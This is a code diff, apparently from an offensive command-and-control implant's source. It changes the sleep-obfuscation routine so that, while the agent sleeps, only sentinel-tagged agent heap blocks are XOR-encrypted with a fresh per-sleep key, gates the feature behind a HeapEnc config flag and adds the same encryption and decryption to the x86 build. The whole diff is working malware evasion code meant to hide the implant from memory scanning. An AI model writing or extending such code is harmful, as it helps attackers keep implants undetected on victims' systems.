@@ -691,8 +691,15 @@ static VOID HeapXorBlock(
 /*!
  * @brief
  *  Walk the default process heap and XOR-encrypt (or decrypt) every busy
- *  allocation with @p Key.  Calling this function twice with the same key
- *  restores the original plaintext.
+ *  allocation that carries the ARC-04 sentinel header.  Only the user-data
+ *  portion past the sentinel is encrypted; the sentinel itself is left
+ *  intact so the decrypt pass can still locate tagged blocks.
+ *
+ *  System/library allocations and heap-manager metadata lack the sentinel
+ *  and are left untouched.
+ *
+ *  Calling this function twice with the same key restores the plaintext
+ *  (XOR is its own inverse).
  *
  * @param Key     16-byte key generated fresh each sleep cycle.
  * @param KeyLen  Length of Key (should be 16).
@@ -710,11 +717,20 @@ VOID HeapEncryptDecrypt(
     }
 
     while ( NT_SUCCESS( Status = Instance->Win32.RtlWalkHeap( HeapHandle, &Entry ) ) ) {
-        if ( ( Entry.Flags & RTL_HEAP_BUSY ) &&
-               Entry.DataAddress != NULL    &&
-               Entry.DataSize    >  0       )
+        if ( ( Entry.Flags & RTL_HEAP_BUSY )   &&
+               Entry.DataAddress != NULL        &&
+               Entry.DataSize    > HEAP_SENTINEL_SIZE &&
+               HEAP_HAS_SENTINEL( Entry.DataAddress ) )
         {
-            HeapXorBlock( (PUCHAR) Entry.DataAddress, Entry.DataSize, Key, KeyLen );
+            /* Encrypt only the user-data region past the sentinel header.
+             * The sentinel bytes stay in the clear so the decrypt walk
+             * can still identify tagged blocks. */
+            HeapXorBlock(
+                (PUCHAR) Entry.DataAddress + HEAP_SENTINEL_SIZE,
+                Entry.DataSize - HEAP_SENTINEL_SIZE,
+                Key,
+                KeyLen
+            );
         }
     }
 }
@@ -1048,13 +1064,14 @@ VOID SleepObf(
         Technique = 0;
     }
 
-    /* ARC-04: generate a per-sleep heap encryption key and encrypt the heap
-     * before entering the sleep technique.  The heap is decrypted after the
-     * sleep returns.  Heap encryption is active whenever any sleep-obfuscation
-     * technique is selected; it is skipped for the plain-sleep fallback path
-     * so that threads running post-ex jobs are not interrupted. */
+    /* ARC-04: generate a per-sleep heap encryption key and encrypt all
+     * sentinel-tagged heap blocks before entering the sleep technique.
+     * Only agent-owned allocations (via MmHeapAlloc) carry the sentinel;
+     * system/library allocations are left intact.
+     * Controlled by the HeapEnc config flag (default: TRUE). */
     UCHAR HeapKey[ 16 ]  = { 0 };
-    BOOL  DoHeapEncrypt  = ( Technique != SLEEPOBF_NO_OBF ) &&
+    BOOL  DoHeapEncrypt  = Instance->Config.Implant.HeapEnc &&
+                           ( Technique != SLEEPOBF_NO_OBF ) &&
                            ( Instance->Win32.RtlWalkHeap  != NULL );
 
     if ( DoHeapEncrypt ) {
@@ -1149,6 +1166,22 @@ VOID SleepObf(
 
 #else
 
+    /* ARC-04 (x86): same sentinel-based heap encryption as x64.
+     * Cronos on x86 does not use thread suspension, so heap encryption
+     * is safe to perform before/after the sleep. */
+    UCHAR HeapKey[ 16 ]  = { 0 };
+    BOOL  DoHeapEncrypt  = Instance->Config.Implant.HeapEnc &&
+                           ( Technique != SLEEPOBF_NO_OBF ) &&
+                           ( Instance->Win32.RtlWalkHeap  != NULL );
+
+    if ( DoHeapEncrypt ) {
+        for ( BYTE i = 0; i < 16; i++ ) {
+            HeapKey[ i ] = (UCHAR) RandomNumber32();
+        }
+        PUTS( "[ARC-04/x86] Encrypting heap before sleep" )
+        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
+    }
+
     /* x86: dispatch on technique, then fall back to ARC-02 / plain sleep */
     switch ( Technique )
     {
@@ -1183,6 +1216,13 @@ VOID SleepObf(
                 Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
             }
         }
+    }
+
+    /* ARC-04/x86: decrypt heap after waking up */
+    if ( DoHeapEncrypt ) {
+        PUTS( "[ARC-04/x86] Decrypting heap after sleep" )
+        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
+        RtlSecureZeroMemory( HeapKey, sizeof( HeapKey ) );
     }
 
 #endif
